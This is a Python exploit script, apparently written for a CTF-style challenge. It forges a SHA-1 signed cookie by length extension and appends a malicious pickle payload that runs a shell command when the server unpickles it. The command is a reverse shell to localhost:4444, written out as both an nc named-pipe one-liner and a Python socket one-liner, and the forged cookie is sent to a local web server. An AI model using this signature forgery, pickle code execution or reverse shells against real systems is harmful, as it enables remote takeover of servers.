#!/usr/bin/python
#
# sha1 padding/length extension attack
# by rd@vnsecurity.net
#
from hashlib import sha1
import sys
import base64
from shaext import shaext
import os
import pickle
from requests import get

def genPayload():
	return pickle.dumps(Exploit())

def inject(user_id, sig):
	url = "http://localhost:5000/"
	cookies = {'user_id': user_id, 'sig' : sig}
	r = get(url, cookies=cookies)

	

if __name__ == '__main__':
	cmd = "rm /tmp/shell; mknod /tmp/shell p; nc localhost 4444 0</tmp/shell | /bin/sh 1>/tmp/shell"
	cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"localhost\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	#orig_msg = "V1:3518a1b391035945d7a95d0c20d0d5ad537ef22c:soka\np0"
	orig_msg = "VjE6MzUxOGExYjM5MTAzNTk0NWQ3YTk1ZDBjMjBkMGQ1YWQ1MzdlZjIyYzpzb2thCnAwCg=="
	orig_msg = orig_msg.decode('base64').replace('\n','')
	keylen = 6
	orig_sig = "9843822e5cf49e919b001d97c687856d4ea02327"
	add_msg = "\ncposix\nsystem\np1\n(S'%s'\np2\ntp3\nRp4\n." % cmd

	ext = shaext(orig_msg, keylen, orig_sig)
	ext.add(add_msg)

	(new_msg, new_sig)= ext.final()

	print "\nnew msg: " + repr(new_msg)
	print "base64: " + base64.b64encode(new_msg)
	print "new sig: " + new_sig
	print "(+) Injecting ..."
	inject(base64.b64encode(new_msg), new_sig)





"""
key = "123456"
keylen = len(key)
orig_msg = "VjE6MzUxOGExYjM5MTAzNTk0NWQ3YTk1ZDBjMjBkMGQ1YWQ1MzdlZjIyYzpzb2thCnAwCg=="
orig_msg = orig_msg.decode('base64').replace('\n','')
orig_sig = sha1(key + orig_msg).hexdigest()
add_msg = "\ncposix\nsystem\np1\n(S'ls -l'\np2\ntp3\nRp4\n."

if len(sys.argv) > 3:
	keylen = int(sys.argv[1])
	orig_msg = sys.argv[2]
	orig_sig = sys.argv[3]
	add_msg = sys.argv[4]


ext = shaext(orig_msg, keylen, orig_sig)
ext.add(add_msg)

(new_msg, new_sig)= ext.final()

print "new msg: " + repr(new_msg)
print "base64: " + base64.b64encode(new_msg)
print "new sig: " + new_sig
print "good sig: %s" % (sha1(key + new_msg).hexdigest())
"""